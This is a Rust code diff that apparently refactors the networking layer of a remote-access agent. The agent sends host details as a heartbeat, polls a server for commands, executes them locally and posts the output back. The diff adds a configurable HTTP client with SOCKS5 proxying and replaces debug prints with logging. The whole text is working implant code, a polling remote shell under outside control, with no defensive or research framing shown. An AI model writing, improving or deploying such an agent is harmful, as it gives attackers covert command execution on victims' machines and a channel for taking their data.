@@ -10,6 +10,8 @@ use tokio::time::timeout;
 use std::time::{Duration}; // commented out SystemTime, UNIX_EPOCH
 use reqwest::StatusCode;
 use crate::networking::egress::get_egress_ip;
+use crate::config::AgentConfig;
+use log::{info, error};
 
 #[cfg(windows)]
 fn create_command(command: &str, args: &[&str]) -> Command {
@@ -87,9 +89,10 @@ async fn execute_command(cmd_parts: &[&str]) -> io::Result<String> {
     }
 }
 
-async fn send_heartbeat(server_addr: &str, agent_id: &str) -> io::Result<()> {
+async fn send_heartbeat_with_client(config: &AgentConfig, server_addr: &str, agent_id: &str) -> io::Result<()> {
     let url = format!("{}/api/agent/{}/heartbeat", server_addr, agent_id);
-    println!("[DEBUG] Sending heartbeat to {} for agent {}", url, agent_id);
+    info!("[HTTP] Sending heartbeat POST to {} (SOCKS5 enabled: {})", url, config.socks5_enabled);
+    let client = config.build_http_client()?;
     
     let os = os_info::get();
     let hostname = hostname::get()?
@@ -109,43 +112,40 @@ async fn send_heartbeat(server_addr: &str, agent_id: &str) -> io::Result<()> {
         "commands": Vec::<String>::new()
     });
 
-    let client = reqwest::Client::builder()
-        .danger_accept_invalid_certs(true)
-        .build()
-        .map_err(|e| io::Error::new(io::ErrorKind::Other, e))?;
-
     let response = client.post(&url)
         .json(&data)
         .send()
         .await
-        .map_err(|e| io::Error::new(io::ErrorKind::Other, e))?;
-
+        .map_err(|e| {
+            error!("[HTTP] Heartbeat POST failed: {}", e);
+            io::Error::new(io::ErrorKind::Other, e)
+        })?;
+    info!("[HTTP] Heartbeat response: {} (SOCKS5 enabled: {})", response.status(), config.socks5_enabled);
     if !response.status().is_success() {
+        error!("[HTTP] Heartbeat failed with status: {}", response.status());
         return Err(io::Error::new(io::ErrorKind::Other, 
             format!("Heartbeat failed with status: {}", response.status())));
     }
-
-    println!("[DEBUG] Heartbeat response: {}", response.status());
     Ok(())
 }
 
-async fn get_command(server_addr: &str, agent_id: &str) -> io::Result<Option<String>> {
+async fn get_command_with_client(config: &AgentConfig, server_addr: &str, agent_id: &str) -> io::Result<Option<String>> {
     let url = format!("{}/api/agent/{}/command", server_addr, agent_id);
-    let client = reqwest::Client::builder()
-        .danger_accept_invalid_certs(true)
-        .build()
-        .map_err(|e| io::Error::new(io::ErrorKind::Other, e))?;
-
+    info!("[HTTP] Sending command GET to {} (SOCKS5 enabled: {})", url, config.socks5_enabled);
+    let client = config.build_http_client()?;
     let response = client.get(&url)
         .send()
         .await
-        .map_err(|e| io::Error::new(io::ErrorKind::Other, e))?;
-
+        .map_err(|e| {
+            error!("[HTTP] Command GET failed: {}", e);
+            io::Error::new(io::ErrorKind::Other, e)
+        })?;
+    info!("[HTTP] Command GET response: {} (SOCKS5 enabled: {})", response.status(), config.socks5_enabled);
     if response.status() == StatusCode::NO_CONTENT {
         return Ok(None);
     }
-
     if !response.status().is_success() {
+        error!("[HTTP] Command fetch failed with status: {}", response.status());
         return Err(io::Error::new(io::ErrorKind::Other, 
             format!("Command fetch failed with status: {}", response.status())));
     }
@@ -162,14 +162,10 @@ async fn get_command(server_addr: &str, agent_id: &str) -> io::Result<Option<Str
     Ok(Some(cmd_resp.command))
 }
 
-async fn submit_result(server_addr: &str, agent_id: &str, command: &str, output: &str) -> io::Result<()> {
+async fn submit_result_with_client(config: &AgentConfig, server_addr: &str, agent_id: &str, command: &str, output: &str) -> io::Result<()> {
     let url = format!("{}/api/agent/{}/result", server_addr, agent_id);
-    let client = reqwest::Client::builder()
-        .danger_accept_invalid_certs(true)
-        .build()
-        .map_err(|e| io::Error::new(io::ErrorKind::Other, e))?;
-    
-    // REMOVE timestamp from the data sent to the server
+    info!("[HTTP] Sending result POST to {} (SOCKS5 enabled: {})", url, config.socks5_enabled);
+    let client = config.build_http_client()?;
     let data = json!({
         "command": command,
         "output": output
@@ -179,9 +175,13 @@ async fn submit_result(server_addr: &str, agent_id: &str, command: &str, output:
         .json(&data)
         .send()
         .await
-        .map_err(|e| io::Error::new(io::ErrorKind::Other, e))?;
-
+        .map_err(|e| {
+            error!("[HTTP] Result POST failed: {}", e);
+            io::Error::new(io::ErrorKind::Other, e)
+        })?;
+    info!("[HTTP] Result POST response: {} (SOCKS5 enabled: {})", response.status(), config.socks5_enabled);
     if !response.status().is_success() {
+        error!("[HTTP] Result submission failed with status: {}", response.status());
         return Err(io::Error::new(io::ErrorKind::Other, 
             format!("Result submission failed with status: {}", response.status())));
     }
@@ -190,31 +190,32 @@ async fn submit_result(server_addr: &str, agent_id: &str, command: &str, output:
 }
 
 pub async fn run_shell(server_addr: &str, agent_id: &str) -> io::Result<()> {
-    println!("[DEBUG] Starting shell with agent ID: {}", agent_id);
-    send_heartbeat(server_addr, agent_id).await?;
+    let config = AgentConfig::load()?;
+    info!("[SHELL] Starting shell with agent ID: {}", agent_id);
+    send_heartbeat_with_client(&config, server_addr, agent_id).await?;
     
     loop {
-        println!("[DEBUG] Polling for commands...");
-        match get_command(server_addr, agent_id).await? {
+        info!("[SHELL] Polling for commands...");
+        match get_command_with_client(&config, server_addr, agent_id).await? {
             Some(command) => {
-                println!("[DEBUG] Received command: {}", command);
+                info!("[SHELL] Received command: {}", command);
                 
                 let cmd_parts: Vec<&str> = command.split_whitespace().collect();
                 
                 match execute_command(&cmd_parts).await {
                     Ok(output) => {
-                        if let Err(e) = submit_result(server_addr, agent_id, &command, &output).await {
-                            println!("[ERROR] Failed to submit result: {}", e);
+                        if let Err(e) = submit_result_with_client(&config, server_addr, agent_id, &command, &output).await {
+                            error!("[SHELL] Failed to submit result: {}", e);
                         } else {
-                            println!("[DEBUG] Result submitted successfully");
+                            info!("[SHELL] Result submitted successfully");
                         }
                     }
                     Err(e) => {
                         let error_msg = format!("Command failed: {}", e);
-                        if let Err(e) = submit_result(server_addr, agent_id, &command, &error_msg).await {
-                            println!("[ERROR] Failed to submit error result: {}", e);
+                        if let Err(e) = submit_result_with_client(&config, server_addr, agent_id, &command, &error_msg).await {
+                            error!("[SHELL] Failed to submit error result: {}", e);
                         }
-                        println!("[ERROR] Shell error: {}. Retrying...", e);
+                        error!("[SHELL] Shell error: {}. Retrying...", e);
                     }
                 }
             }
